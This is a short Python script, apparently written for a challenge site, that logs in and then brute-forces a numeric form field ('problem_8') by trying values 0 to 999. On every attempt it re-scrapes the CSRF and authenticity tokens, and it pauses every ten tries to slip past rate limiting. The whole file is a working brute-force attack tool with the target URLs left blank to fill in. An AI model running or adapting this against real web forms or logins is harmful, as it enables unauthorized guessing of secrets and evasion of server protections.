from time import sleep

import requests
from bs4 import BeautifulSoup
from lxml import html

USERNAME =
PASSWORD =
LOGIN_URL =
GET_URL =  # use if the url has variables
URL =  # the url of the page that the contains the field to brute force
SUBMIT_URL =  # the url that is the action of the form


def main():
    session_requests = requests.session()
    # session_requests.headers.update({"referer":URL})
    # Get login csrf token
    result = session_requests.get(LOGIN_URL)
    tree = html.fromstring(result.text)
    authenticity_token = list(set(tree.xpath("//input[@name='authenticity_token']/@value")))[0]

    # Create payload
    payload = {
        "session[email]": USERNAME,
        "session[password]": PASSWORD,
        "authenticity_token": authenticity_token,
        "Content - Type": "application / x - www - form - urlencoded",
        "Content - Length": "211"
    }
    # Perform login
    result = session_requests.post(LOGIN_URL, data=payload, headers=dict(referer=LOGIN_URL))
    for x in range(0, 1000):
        req = session_requests.get(GET_URL)
        print('[*] Trying With #:', x)

        soup = BeautifulSoup(req.text, "html.parser")
        selector = soup.select("#problem_8 > form > input:nth-of-type(3)")  # token
        if not selector:
            print("[*] Solved:", x)
            break

        authenticity_token = selector[0]['value']

        selector_csrf_token = soup.select("meta:nth-of-type(5)")
        csrf_token = selector_csrf_token[0]['content']

        payload = {
            "utf8": "✓",
            "_method": "create",
            "authenticity_token": authenticity_token,
            "submission[id]": "8",
            "submission[value]": x,
            "commit": "Submit"
        }
        cookies = {
            "authenticity_token": authenticity_token,
            "csrf-token": csrf_token
        }
        result = session_requests.post(SUBMIT_URL, data=payload, cookies=cookies)
        if x % 10 == 0:
            sleep(10)


if __name__ == '__main__':
    main()
